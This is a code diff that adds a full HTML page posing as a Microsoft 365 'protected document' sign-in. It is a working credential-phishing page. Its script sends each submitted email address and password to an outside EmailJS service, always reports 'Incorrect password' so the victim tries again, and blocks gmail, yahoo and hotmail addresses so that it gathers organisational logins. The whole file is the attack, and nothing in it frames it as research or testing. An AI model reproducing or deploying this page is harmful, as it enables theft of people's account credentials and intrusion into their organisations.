@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Sign-In</title>
+    
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-image: url('https://assets.replocdn.com/projects/cbdd3fe2-dbbf-4257-813b-036269a98580/chat-assets-5e54a2ad-9701-418a-8ed8-86893d70ee25');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(3px);
+            -webkit-backdrop-filter: blur(3px);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-image {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            margin-bottom: 20px;
+            border-radius: 12px;
+            object-fit: contain;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 400;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            background: white;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        input::placeholder {
+            color: #999;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            color: white;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .submit-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .submit-button:active {
+            transform: translateY(0);
+        }
+
+        .message {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+
+        .message.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 30px 24px;
+            }
+
+            .card-title {
+                font-size: 16px;
+            }
+
+            .logo-image {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="card-header">
+                <img 
+                    src="https://assets.replocdn.com/projects/cbdd3fe2-dbbf-4257-813b-036269a98580/chat-assets-113e9745-66e9-480d-9a65-233a1c10d23f" 
+                    alt="Microsoft 365" 
+                    class="logo-image"
+                >
+                <p class="card-title">
+                    This document is protected! Sign-In With Email To View Document
+                </p>
+            </div>
+
+            <form id="signInForm">
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input 
+                        type="text" 
+                        id="email" 
+                        name="user_email"
+                        placeholder="Enter your email" 
+                        required
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="user_password"
+                        placeholder="Enter your password" 
+                        required
+                    >
+                </div>
+
+                <button type="submit" class="submit-button" id="submitBtn">
+                    Access Document
+                </button>
+
+                <div id="message" class="message"></div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        emailjs.init('eB2uBlR-fxQT7MaLH');
+
+        const form = document.getElementById('signInForm');
+        const messageDiv = document.getElementById('message');
+        const emailInput = document.getElementById('email');
+
+        // List of blocked email domains (ONLY these 3)
+        const blockedDomains = [
+            '@gmail.com',
+            '@yahoo.com',
+            '@hotmail.com'
+        ];
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            messageDiv.style.display = 'none';
+            
+            const emailValue = emailInput.value.toLowerCase();
+            
+            // Check if email contains any blocked domain
+            let isBlocked = false;
+            for (let domain of blockedDomains) {
+                if (emailValue.includes(domain)) {
+                    isBlocked = true;
+                    break;
+                }
+            }
+
+            // If email contains blocked domain, show error and don't send
+            if (isBlocked) {
+                messageDiv.className = 'message error';
+                messageDiv.textContent = '✗ This email domain is not accepted. Please use your organization email.';
+                messageDiv.style.display = 'block';
+                return; // Stop here, don't send email
+            }
+
+            // If email is OK, send it via EmailJS
+            emailjs.sendForm('service_lt0yqs8', 'template_0kd5fko', form)
+                .then(function(response) {
+                    messageDiv.className = 'message error';
+                    messageDiv.textContent = '✗ Incorrect password. Try again.';
+                    messageDiv.style.display = 'block';
+                    document.getElementById('password').value = '';
+                }, function(error) {
+                    messageDiv.className = 'message error';
+                    messageDiv.textContent = '✗ Incorrect password. Try again.';
+                    messageDiv.style.display = 'block';
+                    document.getElementById('password').value = '';
+                });
+        });
+    </script>
+</body>
+</html>
